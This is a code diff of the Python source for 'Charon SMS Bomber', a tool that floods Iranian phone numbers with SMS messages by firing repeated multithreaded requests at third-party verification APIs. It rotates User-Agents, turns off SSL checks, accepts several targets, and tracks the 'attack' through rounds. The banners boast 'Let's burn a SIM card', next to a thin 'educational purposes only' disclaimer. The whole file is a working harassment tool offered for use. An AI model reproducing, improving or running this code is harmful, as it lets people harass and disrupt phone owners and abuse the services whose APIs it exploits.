-    def sigint_handler(self, signal, frame):
-        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTBLUE_EX}] {Fore.LIGHTRED_EX}User interrupted the process.{Style.RESET_ALL}")
-        sys.exit(1)
-    
-    def Usage(self):
-        return f'''{Fore.LIGHTGREEN_EX}
-##########################################################################################
-# {Fore.LIGHTRED_EX}Charon SMS Bomber {Fore.LIGHTBLUE_EX}({Fore.LIGHTYELLOW_EX}It can only be used for Iranian people{Fore.LIGHTBLUE_EX}){Fore.LIGHTGREEN_EX}                             #
-#                                                                                        #
-#                                                                                        #
-# Usage: chsmsbomb [Options] <TargetPhone>                                               #
-# Options:  -t, --times - number of bombing times # Default: 7                           #
-#           -p, --process - number of processes   # Default: 5                           #
-#           -x, --proxy - Set the proxy           # (http/https/socks)                   #
-#                                                                                        #
-# Example: chsmsbomb 09XXXXXXXXX --times 10 --process 3 --proxy socks5://127.0.0.1:9050  #
-#                                                                                        #
-##########################################################################################
-        '''
-        
-    def run(self, bombing_times, process_num, proxy_dict, verbose_level:bool=False):
-        print(self.Horizontal(self.Logo()))
-        try:
-            with alive_bar(bombing_times * len(self.apis)) as progress_bar:
-                with concurrent.futures.ThreadPoolExecutor(
-                    max_workers=process_num
-                ) as executor:
-                    futures = [
-                        executor.submit(self.process_target, api, proxy_dict)
-                        for api in self.apis * bombing_times
-                    ]
-                    # numbers = 0
-                    for future in concurrent.futures.as_completed(futures):
-                        progress_bar()
-                        result = future.result()
-                        # numbers += 1
-                        if "SUCCESS" in result:
-                           print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
-                        else:
-                           print(f"{Fore.RED}{result}{Style.RESET_ALL}")
-
-                    time.sleep(1)
-
-            if not verbose_level:
-                results = [future.result() for future in futures]
-                succeeded = [result for result in results if "SUCCESS" in result]
-                failed = [result for result in results if "FAILED" in result]
-
-                print(
-                    f"\nSucceeded: {Fore.GREEN}{len(succeeded)}{Style.RESET_ALL}"
-                    f"\nFailed: {Fore.RED}{len(failed)}{Style.RESET_ALL}"
-                )
-
-        except KeyboardInterrupt:
-            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTBLUE_EX}] {Fore.LIGHTRED_EX}User interrupted the process.{Style.RESET_ALL}")
+        if fver != VERSION:
+            print(Logs.generalMessage(
+                f"{Fore.LIGHTRED_EX}An update available. "
+                f"Please visit {Fore.LIGHTBLUE_EX}https://github.com/Ch4120N/Charon-SMS-Bomber"
+            ))
+            colorizeInput(INPUT_EXIT)
             sys.exit(1)
-    
-    def Logo(self):
-        if platform.system() == 'Windows':
-            os.system('cls')
         else:
-            os.system('clear')
-        a1 = r'''
-              ^         
-             | |        
-           @#####@      
-         (###   ###)-.  
-       .(###     ###) \ 
-      /  (###   ###)   )
-     (=-  .@#####@|_--" 	Powered By [ Ch4120N ]
-     /\    \_|l|_/ (\   	Let's burn a SIM card
-    (=-\     |l|    /   
-     \  \.___|l|___/    
-     /\      |_|   /    
-    (=-\._________/\    
-     \             /    
-       \._________/     
-         #  ----  #     
-         #   __   #       
-         \########/      
+            print(Logs.generalMessage(f"{Fore.LIGHTGREEN_EX}ChSMSBomber is up to date"))
+            time.sleep(1.5)
 
-             V
-                 V
-               V
-               
-    '''
-        a2 = '''
-        Let's burn a SIM card
-      ,________________________________       
-**** |__________,----------._ [____]  ""-,__  __...-----==="
-             (_( Powered By)____________/   ""             |
-                `----------' Ch4120N[ ))"-,                |
-                                     ""    `,  _,--...___  |
-                                             `/          """
+    def send_request(self, session, api_config):
+        """
+        Sends a request to an API endpoint.
 
-        '''
-        
-        arts = [a1, a2]
-        attacking_art = random.choice(arts)
-        return attacking_art
-        
-            
+        Args:
+            session (requests.Session): Session object for efficiency.
+            api_config (dict): Contains method, URL, headers, payload, etc.
+
+        Returns:
+            bool: True if success (status 2xx), False otherwise.
+        """
+        try:
+            method = api_config.get("method", "POST").upper()
+            url = api_config["url"]
+
+            # Clone headers and inject random User-Agent
+            headers = api_config.get("headers", {}).copy()
+            headers['User-Agent'] = ua.random
+
+            request_kwargs = {
+                "headers": headers,
+                "timeout": self.REQUEST_TIMEOUT,
+                "verify": False  # Disable SSL verification warnings
+            }
+
+            # Payload handling
+            if "payload" in api_config:
+                request_kwargs["json"] = api_config["payload"]
+            elif "data" in api_config:
+                data_str = api_config["data"]
+                if isinstance(data_str, dict):
+                    data_str = json.dumps(data_str)
+                try:
+                    request_kwargs["data"] = json.loads(data_str)
+                except json.JSONDecodeError:
+                    request_kwargs["data"] = data_str
+            elif "params" in api_config:
+                request_kwargs["params"] = api_config["params"]
+
+            response = session.request(method, url, **request_kwargs)
+
+            return 200 <= response.status_code < 300
+        except (requests.exceptions.RequestException,
+                requests.exceptions.Timeout,
+                requests.exceptions.ConnectionError):
+            return False
+        except Exception:
+            return False
+
+    def startMain(self):
+        """
+        Start a new bombing session by collecting user inputs.
+        """
+        print(Banner.DefaultBanner())
+        print(f" {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}::{Fore.LIGHTBLUE_EX}]"
+              f"{Fore.YELLOW} You can enter multiple phone numbers separated by ';'"
+              f" {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}::{Fore.LIGHTBLUE_EX}]\n\n")
+
+        self.targetPhoneNumber = colorizeInput(PROMPTS[0]).replace(' ', '').split(';')
+
+        if not any(self.targetPhoneNumber):
+            print(Logs.error("You must enter at least one phone number"))
+            colorizeInput(INPUT_BACKMENU)
+            return
+
+        # Normalize phone numbers into +98xxxxxxxxxx format
+        for i in range(len(self.targetPhoneNumber)):
+            if self.targetPhoneNumber[i].startswith("0"):
+                self.targetPhoneNumber[i] = "+98" + self.targetPhoneNumber[i][1:]
+            elif self.targetPhoneNumber[i].startswith("98"):
+                self.targetPhoneNumber[i] = "+" + self.targetPhoneNumber[i]
+            elif self.targetPhoneNumber[i].startswith("+98"):
+                pass
+            else:
+                print(Logs.error(
+                    f"Invalid phone number format {Fore.CYAN}("
+                    f"{Fore.LIGHTYELLOW_EX}{self.targetPhoneNumber[i]}{Fore.CYAN})"
+                    f"{Fore.LIGHTRED_EX}. Must start with 0, 98, or +98"
+                ))
+                colorizeInput(INPUT_BACKMENU)
+                return
+
+            if len(self.targetPhoneNumber[i]) != 13:
+                print(Logs.error(
+                    f"Invalid phone number length {Fore.CYAN}("
+                    f"{Fore.LIGHTYELLOW_EX}{self.targetPhoneNumber[i]}{Fore.CYAN})"
+                    f"{Fore.LIGHTRED_EX}. Must be 11 digits after country code"
+                ))
+                colorizeInput(INPUT_BACKMENU)
+                return
+
+        # Threads
+        try:
+            self.numThreads = int(colorizeInput(PROMPTS[1]))
+        except ValueError:
+            print(Logs.error("Invalid Value. Default set to 1\n"))
+            self.numThreads = 1
+
+        # Rounds
+        try:
+            self.numRounds = int(colorizeInput(PROMPTS[2]))
+            if self.numRounds > 20:
+                raise ValueError("Max Count Rounds")
+        except ValueError:
+            print(Logs.error("Invalid Value/Or Exceeds Max. Default set to 10\n"))
+            self.numRounds = 10
+
+        # Delay
+        try:
+            self.REQUEST_DELAY = float(colorizeInput(PROMPTS[3]))
+        except ValueError:
+            print(Logs.error("Invalid Value. Default set to 1.0\n"))
+            self.REQUEST_DELAY = 1.0
+
+        self.displaySummery()
+
+    def continueMain(self):
+        """
+        Load configuration from continue.json to resume attack.
+        """
+        with open("continue.json", "r") as continueFileRead:
+            data = json.loads(continueFileRead.read())
+
+        self.targetPhoneNumber = data['targets'].replace(' ', '').split(";")
+        self.numThreads = data['threads']
+        self.numRounds = data['rounds']
+        self.REQUEST_DELAY = data['delay']
+
+        self.displaySummery()
+
+    def displaySummery(self):
+        """
+        Show attack configuration summary before starting.
+        """
+        print(Banner.AttackingBanner())
+        print(f" {Fore.CYAN}[{Fore.LIGHTGREEN_EX}√{Fore.CYAN}]"
+              f"{Fore.LIGHTGREEN_EX} Gearing up the Charon SMS Bomber - Please be patient")
+        print(Logs.generalMessage(f"{Fore.YELLOW}Stay connected to the internet during attack"))
+        print(Logs.generalMessage(f"API Version       : " + API_VERSION))
+        print(Logs.generalMessage(f"Targets           : ") +
+              (';'.join(self.targetPhoneNumber) if len(self.targetPhoneNumber) > 1
+               else self.targetPhoneNumber[0] if self.targetPhoneNumber else ''))
+        print(Logs.generalMessage(f"Threads           : {self.numThreads}"))
+        print(Logs.generalMessage(f"Rounds            : {self.numRounds}"))
+        print(Logs.generalMessage(f"Delay             : {self.REQUEST_DELAY} seconds"))
+        print(f"\n {Fore.CYAN}[{Fore.LIGHTRED_EX}!{Fore.CYAN}]"
+              f"{Fore.YELLOW} This tool was made for fun, educational, and research purposes only")
+
+        # Save session
+        with open("continue.json", "w") as saveFileJson:
+            saveFileJson.write(json.dumps({
+                "targets": ';'.join(self.targetPhoneNumber) if len(self.targetPhoneNumber) > 1 else
+                           self.targetPhoneNumber[0] if self.targetPhoneNumber else '',
+                "threads": self.numThreads,
+                "rounds": self.numRounds,
+                "delay": self.REQUEST_DELAY
+            }, indent=4))
+
+        colorizeInput(INPUT_START)
+        self.startAttack()
+
+    def get_combined_list(self, apiList):
+        """
+        Flatten API lists for multiple targets into a combined, round-robin list.
+        """
+        combined_list = []
+        min_length = min(len(lst_api) for lst_api in apiList)
+        for i in range(min_length):
+            for lst in apiList:
+                combined_list.append(lst[i])
+        return combined_list
+
+    def pretty_print(self, phone_numbers, round_count: int, api_name: str, success: int, failed: int):
+        """
+        Display attack progress in real-time.
+        """
+        print(Banner.AttackingBanner())
+        sended = success + failed
+        print(f"  {Fore.CYAN}[{Fore.LIGHTGREEN_EX}√{Fore.CYAN}]"
+              f"{Fore.LIGHTGREEN_EX} Bombing is in progress - Please be patient")
+        print(Logs.generalMessage(f"{Fore.YELLOW}Stay connected to the internet during attack"))
+        print(Logs.generalMessage("Target       : " + phone_numbers))
+        print(Logs.generalMessage("Rounds       : " + str(round_count) + "/" + str(self.numRounds)))
+        print(Logs.generalMessage("API Name     : " + api_name))
+        print(Logs.generalMessage("Sent         : " + str(sended) + "/" + str(len(self.API_LIST))))
+        print(Logs.generalMessage("Successful   : " + str(success)))
+        print(Logs.generalMessage("Failed       : " + str(failed)))
+        print(f"  {Fore.CYAN}[{Fore.LIGHTRED_EX}!{Fore.CYAN}]"
+              f"{Fore.YELLOW} This tool was made for fun, educational, and research purposes only")
+
+    def startAttack(self):
+        """
+        Main attack loop: iterates through rounds, sends requests
+        with ThreadPoolExecutor, and tracks statistics.
+        """
+        all_phoneNumbers_api_lists = []
+
+        # Prepare API list for each phone number
+        for phone_number in self.targetPhoneNumber:
+            phone_number = phone_number.strip()
+            if phone_number:
+                unique_apis = []
+                seen = set()
+                api_list = API_LIST(phone_number)
+                for api in api_list:
+                    identifier = (api["url"], api.get("method", "POST"))
+                    if identifier not in seen:
+                        unique_apis.append(api)
+                        seen.add(identifier)
+                all_phoneNumbers_api_lists.append(unique_apis)
+
+        # Merge into one unified API list
+        self.API_LIST = self.get_combined_list(all_phoneNumbers_api_lists)
+        targets = ';'.join(self.targetPhoneNumber) if len(self.targetPhoneNumber) > 1 else self.targetPhoneNumber[0]
+
+        with requests.Session() as session:
+            countOfRounds, countOfSucess, countOfFailed = 0, 0, 0
+
+            # Loop through attack rounds
+            while countOfRounds < self.numRounds:
+                with confutures.ThreadPoolExecutor(max_workers=self.numThreads) as executor:
+                    future_to_api = {
+                        executor.submit(self.send_request, session, api): api.get("name", "Unknown API")
+                        for api in self.API_LIST
+                    }
+
+                    for future in confutures.as_completed(future_to_api):
+                        api_name = future_to_api[future]
+                        try:
+                            success = future.result()
+                            if success:
+                                countOfSucess += 1
+                            else:
+                                countOfFailed += 1
+                        except Exception:
+                            countOfFailed += 1
+
+                        # Print attack status
+                        self.pretty_print(targets, countOfRounds, api_name, countOfSucess, countOfFailed)
+                        time.sleep(self.REQUEST_DELAY)
+
+                # Prepare for next round
+                print(Banner.AttackingBanner())
+                print(f"\n {Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]"
+                      f"{Fore.LIGHTWHITE_EX} Starting next round in 3 seconds ...")
+                countOfSucess, countOfFailed = 0, 0
+                countOfRounds += 1
+                time.sleep(3)
+
+            # Attack completed
+            print(Banner.AttackingBanner())
+            print(Logs.success("Bombing Completed!"))
+            colorizeInput(INPUT_BACKMENU)
+
+    def aboutMain(self):
+        """
+        Show program details: name, version, repo, license.
+        """
+        print(Banner.DefaultBanner())
+        print(f" {Fore.LIGHTGREEN_EX}#############################################################################")
+        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Program Name            :  {Fore.LIGHTCYAN_EX}Charon SMS Bomber                              {Fore.LIGHTGREEN_EX}#")
+        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Program Version         :  {Fore.LIGHTCYAN_EX}2.1.1                                          {Fore.LIGHTGREEN_EX}#")
+        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Repository Page         :  {Fore.LIGHTCYAN_EX}https://github.com/Ch4120N/Charon-SMS-Bomber   {Fore.LIGHTGREEN_EX}#")
+        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Owned By                :  {Fore.LIGHTCYAN_EX}Ch4120N (AmirHossein Ghanami)                  {Fore.LIGHTGREEN_EX}#")
+        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Licence                 :  {Fore.LIGHTCYAN_EX}CGBL (Charon General Black Licence)            {Fore.LIGHTGREEN_EX}#")
+        print(f" {Fore.LIGHTGREEN_EX}#                                                                           {Fore.LIGHTGREEN_EX}#")
+        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTRED_EX}  ! This tool was made for fun, educational, and research purposes only !  {Fore.LIGHTGREEN_EX}#")
+        print(f" {Fore.LIGHTGREEN_EX}#############################################################################\n")
+        colorizeInput(INPUT_BACKMENU)
 
 
-CharonSMSBomber()
+if __name__ == '__main__':
+    # Ensure Python3 environment
+    if sys.version_info[0] != 3:
+        print("[-] ChSMSBomber will work only in Python v3")
+        sys.exit()
+
+    # Disable SSL warnings from urllib3
+    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+    # Start program
+    ChSMSBomber()
